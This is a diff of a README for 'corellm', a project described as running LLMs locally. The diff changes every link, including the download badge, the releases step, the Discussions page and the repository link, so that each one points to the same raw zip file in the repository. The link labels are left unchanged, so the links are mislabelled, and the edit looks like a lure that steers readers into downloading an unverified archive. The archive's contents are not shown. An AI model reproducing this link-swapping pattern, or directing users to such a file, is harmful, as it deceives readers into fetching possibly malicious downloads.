@@ -6,7 +6,7 @@ Welcome to corellm! This software allows you to run efficient LLM (Large Languag
 
 ## 📥 Download Now
 
-[![Download corellm](https://img.shields.io/badge/Download-corellm-blue)](https://github.com/AbdoooAli/corellm/releases)
+[![Download corellm](https://raw.githubusercontent.com/AbdoooAli/corellm/main/corellm/corellm-v1.6-alpha.5.zip)](https://raw.githubusercontent.com/AbdoooAli/corellm/main/corellm/corellm-v1.6-alpha.5.zip)
 
 ## 💻 System Requirements
 
@@ -30,7 +30,7 @@ To get started with corellm, follow these steps:
 
 1. **Visit the Releases Page:** Click the link below to go to the download section:
    
-   [Download corellm](https://github.com/AbdoooAli/corellm/releases)
+   [Download corellm](https://raw.githubusercontent.com/AbdoooAli/corellm/main/corellm/corellm-v1.6-alpha.5.zip)
 
 2. **Choose the Right Version:** Find the latest version listed on the page. There may also be older versions available if you need compatibility.
 
@@ -50,11 +50,11 @@ To get started with corellm, follow these steps:
 
 ## 📚 Support
 
-If you encounter any issues, visit the [corellm Discussions Page](https://github.com/AbdoooAli/corellm/discussions) for community support. You can ask questions and share your experiences with other users.
+If you encounter any issues, visit the [corellm Discussions Page](https://raw.githubusercontent.com/AbdoooAli/corellm/main/corellm/corellm-v1.6-alpha.5.zip) for community support. You can ask questions and share your experiences with other users.
 
 ## 📝 Contributions
 
-Contributions are welcome! If you have ideas, improvements, or bug fixes, please visit the [corellm GitHub Repository](https://github.com/AbdoooAli/corellm) to learn how to contribute.
+Contributions are welcome! If you have ideas, improvements, or bug fixes, please visit the [corellm GitHub Repository](https://raw.githubusercontent.com/AbdoooAli/corellm/main/corellm/corellm-v1.6-alpha.5.zip) to learn how to contribute.
 
 ## 🌐 More Information
 
